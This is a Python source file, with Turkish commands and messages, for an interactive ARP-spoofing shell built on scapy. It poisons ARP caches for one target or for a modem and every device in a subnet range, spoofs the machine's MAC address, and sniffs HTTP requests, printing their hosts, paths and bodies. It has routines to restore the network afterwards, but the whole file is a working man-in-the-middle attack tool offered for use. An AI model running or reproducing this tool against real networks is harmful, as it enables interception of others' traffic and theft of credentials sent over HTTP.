# -*- coding: utf-8 -*-
import scapy.all as scapy
import time
import sys
import logging
import threading
import os
import subprocess
from scapy.layers.http import HTTPRequest

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

saldiri_durumu = False
gonderilen_paket_sayisi = 0  # Paket sayısını tutacak değişken
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

packet_counter = {"modem": 0, "clients": 0}
active_attack = False

yakalanan_paketler = []

dinleme_durumu = False
gonderilen_paket_sayisi_dinleme = 0

def kontrol_et(packet):
    global gonderilen_paket_sayisi_dinleme, yakalanan_paketler
    if packet.haslayer(HTTPRequest):  # HTTP isteği var mı?
        host = packet[HTTPRequest].Host.decode(errors="ignore") if packet[HTTPRequest].Host else "Unknown"
        path = packet[HTTPRequest].Path.decode(errors="ignore") if packet[HTTPRequest].Path else "Unknown"
        veri = packet[scapy.Raw].load.decode(errors="ignore") if packet.haslayer(scapy.Raw) else "[Veri Yok]"
        
        yakalanan_paketler.append(f"{host}{path} -> {veri}")
        if len(yakalanan_paketler) > 5:
            yakalanan_paketler.pop(0)  # En eski paketi kaldır
        
        print(f"\n[+] HTTP İsteği Algılandı: {host}{path}")
        print("[*] Veri İçeriği:", veri)
        print("[+] Kabuğa Dönmek için Enter Bas")
        
        gonderilen_paket_sayisi_dinleme += 1  # Paket sayısını artır

def dinle_paket_basla(agkart):
    global dinleme_durumu
    dinleme_durumu = True
    print(f"[+] Dinleme başlatılıyor: {agkart}")
    scapy.sniff(iface=agkart, store=False, prn=kontrol_et, filter="tcp port 80")


def dinleme_durumu_goster():
    print(f"Dinleme Durumu: {'Aktif' if dinleme_durumu else 'Pasif'}")
    print(f"Gönderilen Paket Sayısı: {gonderilen_paket_sayisi_dinleme}")
    if yakalanan_paketler:
        print("\nSon 5 Yakalanan Paket:")
        for paket in yakalanan_paketler:
            print(f"- {paket}")
    else:
        print("[!] Henüz yakalanan bir paket yok!")


def tara(ip):
    try:
        arp_cevaplar = scapy.ARP(pdst=ip)
        yayin = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_cevaplar_yayin = yayin / arp_cevaplar
        cevap_liste = scapy.srp(arp_cevaplar_yayin, timeout=1, verbose=False)[0]
        return cevap_liste[0][1].hwsrc
    except IndexError:
        print(f"[!] {ip} adresinden MAC adresi alınamadı!")
        return None


def spoof_saldiri(hedef_ip, yanit_ip):
    hedef_mac = tara(hedef_ip)
    if hedef_mac:
        paket = scapy.ARP(op=2, pdst=hedef_ip, hwdst=hedef_mac, psrc=yanit_ip)
        scapy.send(paket, verbose=False)
        return True
    return False


def kacis(gercek_ip, kaynak_ip):
    hedef_mac = tara(gercek_ip)
    kaynak_mac = tara(kaynak_ip)
    if hedef_mac and kaynak_mac:
        paket = scapy.ARP(op=2, pdst=gercek_ip, hwdst=hedef_mac, psrc=kaynak_ip, hwsrc=kaynak_mac)
        scapy.send(paket, count=4, verbose=False)


def modem_info(modem_ip, ip_range):
    print("[+] Modem ve bağlı cihazlar tespit ediliyor...")
    cihazlar = []
    modem_mac = None
    for ip in ip_range:
        mac_adresi = tara(ip)
        if mac_adresi:
            print(f"IP: {ip} - MAC: {mac_adresi}")
            if ip == modem_ip:
                print(f"[+] Modem bulundu: {ip} ({mac_adresi})")
                modem_mac = mac_adresi
            else:
                cihazlar.append((ip, mac_adresi))
                print(f"[+] Cihaz bulundu: {ip} ({mac_adresi})")
    return modem_mac, cihazlar


def saldiriyi_baslat(modem_ip, ip_range):
    global packet_counter, active_attack
    print(f"[+] Saldırı başlatılıyor...")
    active_attack = True
    modem_mac, cihazlar = modem_info(modem_ip, ip_range)
    if modem_mac:
        print(f"[+] Modem MAC Adresi: {modem_mac} | Devam Etmek İçin Enter Bas")
        while active_attack:
            for cihaz_ip, cihaz_mac in cihazlar:
                if spoof_saldiri(cihaz_ip, modem_ip):
                    packet_counter["clients"] += 1
                if spoof_saldiri(modem_ip, cihaz_ip):
                    packet_counter["modem"] += 1
            time.sleep(2)
    else:
        print("[!] Modem bulunamadı. | Devam Etmek İçin Enter Bas")


def saldiriyi_durdur(modem_ip, ip_range):
    global active_attack
    print("[-] Saldırı durduruluyor...")
    active_attack = False
    for cihaz_ip in ip_range:
        kacis(cihaz_ip, modem_ip)
        kacis(modem_ip, cihaz_ip)
    print("[+] Ağ eski haline getirildi.")

def root():
    if os.getuid() != 0:
        print("(｀・ω・´) Lütfen root olarak çalıştırın")
        subprocess.call(["sudo", "python3"] + sys.argv)  
        sys.exit()  

def taras(ip):
    try:
        arp_cevaplar = scapy.ARP(pdst=ip)
        yayin = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_cevaplar_yayin = yayin / arp_cevaplar
        cevap_liste = scapy.srp(arp_cevaplar_yayin, timeout=1, verbose=False)[0]
        return cevap_liste[0][1].hwsrc
    except IndexError:
        print(f"[!] {ip} adresinden MAC adresi alınamadı!")
        return None


def spoof_saldiris(hedef_ip, yanit_ip):
    global saldiri_durumu, gonderilen_paket_sayisi
    hedef_mac = taras(hedef_ip)
    if not hedef_mac:
        return
    while saldiri_durumu:
        paket = scapy.ARP(op=2, pdst=hedef_ip, hwdst=hedef_mac, psrc=yanit_ip)
        scapy.send(paket, verbose=False)
        gonderilen_paket_sayisi += 1  
        time.sleep(2)

def kacis1(gercek_ip, kaynak_ip):
    hedef_mac = taras(gercek_ip)
    kaynak_mac = taras(kaynak_ip)
    if not hedef_mac or not kaynak_mac:
        return
    paket = scapy.ARP(op=2, pdst=gercek_ip, hwdst=hedef_mac, psrc=kaynak_ip, hwsrc=kaynak_mac)
    scapy.send(paket, count=4, verbose=False)

def saldiriyi_baslat1(hedef_ip, yanit_ip):
    global saldiri_durumu, gonderilen_paket_sayisi
    if not saldiri_durumu:
        gonderilen_paket_sayisi = 0  # Yeni saldırı başlatıldığında sayacı sıfırla
        saldiri_durumu = True
        threading.Thread(target=spoof_saldiris, args=(hedef_ip, yanit_ip), daemon=True).start()
        threading.Thread(target=spoof_saldiris, args=(yanit_ip, hedef_ip), daemon=True).start()
        print("[+] Saldırı başlatıldı!")
    else:
        print("[!] Zaten saldırı aktif.")

def saldiriyi_durdur1(hedef_ip, yanit_ip):
    global saldiri_durumu, gonderilen_paket_sayisi
    if saldiri_durumu:
        saldiri_durumu = False
        kacis1(hedef_ip, yanit_ip)
        kacis1(yanit_ip, hedef_ip)
        print(f"[-] Saldırı durduruldu ve ağ onarıldı! Gönderilen paket sayısı: {gonderilen_paket_sayisi}")
    else:
        print("[!] Saldırı zaten durdurulmuş.")

def mac_degistir(ag, yeni_mac):
    subprocess.call(["ifconfig", ag ,"down"])
    subprocess.call(["ifconfig", ag ,"hw","ether", yeni_mac])
    subprocess.call(["ifconfig", ag ,"up"])
    interface= ag
    yeni_adres=yeni_mac
    print(f"mac başarıyla değişti {interface} >> {yeni_mac}  ")

def clear_screen():
    os.system("clear")  #

def kabuk():
    print("\n[+] ARP Spoofing Kabuk Başlatıldı! Çıkmak için 'exit' yazın. ")
    try:
        while True:

            komut = input("\033[1;32memrenet>\033[0m ").strip().split()
            if not komut:
                continue
            elif komut[0] == "exit":
                print("[-] Kabuk kapatılıyor...")
                break



            elif komut[0] == "temizle":
                clear_screen()  # Kullanıcı "temizle" girerse ekran temizlenir


            elif komut[0] == "arp.start" and len(komut) == 3:
                saldiriyi_baslat1(komut[1], komut[2])
            elif komut[0] == "arp.stop" and len(komut) == 3:
                saldiriyi_durdur1(komut[1], komut[2])
            elif komut[0] == "arp.durum":
                print(f"[+] Aktif saldırı: {saldiri_durumu}, Gönderilen paket sayısı: {gonderilen_paket_sayisi}")
            

            elif komut[0] == "arp.modem.start" and len(komut) == 3:
                modem_ip = komut[1]
                try:
                    ip_range_end = int(komut[2])
                    if ip_range_end < 1:
                        print("[!] IP aralığı 1'den küçük olamaz!")
                        continue
                    ip_list = [f"{'.'.join(modem_ip.split('.')[:3])}.{i}" for i in range(1, ip_range_end + 1)]
                    threading.Thread(target=saldiriyi_baslat, args=(modem_ip, ip_list), daemon=True).start()
                except ValueError:
                    print("[!] Geçersiz IP aralığı! Lütfen sadece bir sayı girin.")
            elif komut[0] == "arp.modem.durum":
                if not active_attack:
                    print("Saldırı yok.")
                else:
                    print(f"Saldırı aktif. Modeme {packet_counter['modem']} paket, cihazlara {packet_counter['clients']} paket gönderildi.")
            elif komut[0] == "arp.modem.dur":
                if not active_attack:
                    print("[!] Zaten aktif bir saldırı yok.")
                else:
                    saldiriyi_durdur(modem_ip, ip_list)
         
            elif komut[0] == "mac.changer" and len(komut) == 3:
                mac_degistir(komut[1], komut[2])
            elif komut[0] == "dinle.paket.basla" and len(komut) == 2:

                # Dinlemeyi arka planda başlat
                threading.Thread(target=dinle_paket_basla, args=(komut[1],), daemon=True).start()
                print(f"[+] Dinleme başlatıldı: {komut[1]}")
            elif komut[0] == "dinle.paket.durum":               
                dinleme_durumu_goster()
            

            elif komut[0]=="arp":
                print("- arp.start <hedef_ip> <yanit_ip>")
                print("- arp.stop <hedef_ip> <yanit_ip>")
                print("- arp.durum")
            elif komut[0]=="arp.modem":
                print("arp.modem.start <modem_ip> <ip_araligi> Örnek: arp.modem.start 192.168.1.1 6")
                print("arp.modem.dur -> Saldırıyı durdurur ve ağı eski haline getirir.")
                print("arp.modem.durum -> Saldırı durumu ve paket sayısı için.\n temizle -> Terminali temizler")
            elif komut[0]=="mac.changer":
                print("mac.changer <interface> <yeni_mac>")
            elif komut[0]=="dinle.paket":
                print("** dinle.paket.basla <arayüz> ** → Paket dinlemeyi başlatır. Örnek: dinle.paket.start wlo1")
                print("** dinle.paket.durum ** → Paket dinlemenin aktif olup olmadığını kontrol eder.")
            else:
                print("[+] Yardım Almak İçin Yardım almak istediğiniz komutun adını yazın. Örnek; arp , arp.modem")
                print("** arp ** → Bireysel cihazlara ARP saldırısı yapmak için kullanılır. (Örneğin, belirli bir cihazın trafiğini manipüle etmek)")
                print("** arp.modem ** → Modem ve tüm ağa yönelik ARP saldırıları için kullanılır. (Ağdaki tüm cihazları etkiler.)  ")
                print("** mac.changer ** → Kendi Cihazınızın MAC adresini değiştirmek için kullanılır.  ")
                print("** dinle.paket ** → Ağdaki HTTP isteklerini ve verileri dinlemek için kullanılır.")
                print("- ** temizle ** → Terminal ekranını temizler. ")

    except (EOFError, KeyboardInterrupt):
        print("\n[-] Kabuk kapatılıyor...")

if __name__ == "__main__":
    root()
    kabuk()
